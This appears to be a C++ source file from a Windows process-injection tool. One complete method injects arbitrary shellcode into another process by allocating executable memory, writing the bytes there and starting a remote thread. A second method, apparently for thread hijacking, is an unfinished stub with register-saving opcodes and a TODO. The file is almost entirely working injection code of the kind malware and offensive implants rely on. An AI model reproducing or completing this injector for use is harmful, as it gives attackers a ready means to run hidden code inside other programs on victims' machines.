#include "inject.h"

void injector_t::inject_shellcode_crt(const PROCESS_INFO& process_info, const std::vector<BYTE>& shellcode)
{
   
    // Allocate memory for the shellcode
    LPVOID allocated = VirtualAllocEx(process_info.handle.get(), NULL, shellcode.size(), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (allocated == NULL)
    {
        print_error(GetLastError());
        return;
    }

    // Injecting the shellcode into the process
    SIZE_T bytes_written;
    if (!WriteProcessMemory(process_info.handle.get(), allocated, &shellcode[0], shellcode.size(), &bytes_written))
    {
        print_error(GetLastError());
        return;
    }

    // Execute the shellcode
    HANDLE thread = CreateRemoteThread(process_info.handle.get(), NULL, NULL, (LPTHREAD_START_ROUTINE)allocated, NULL, NULL, NULL);
    if (thread == NULL)
    {
        print_error(GetLastError());
        return;
    }
    WaitForSingleObject(thread, INFINITE);
    CloseHandle(thread);

    // Free the allocated memory
    if (!VirtualFreeEx(process_info.handle.get(), allocated, 0, MEM_RELEASE))
    {
        print_error(GetLastError());
        return;
    }
}

void injector_t::inject_shellcode_mth(const PROCESS_INFO& process_info, const std::vector<BYTE>& shellcode)
{
    std::vector<BYTE> prologue = { 0x60, 0x9c }; // pushal; pushfd
    std::vector<BYTE> epilogue = { 0x9d, 0x61 }; // popfd; popal
    
    // TODO

}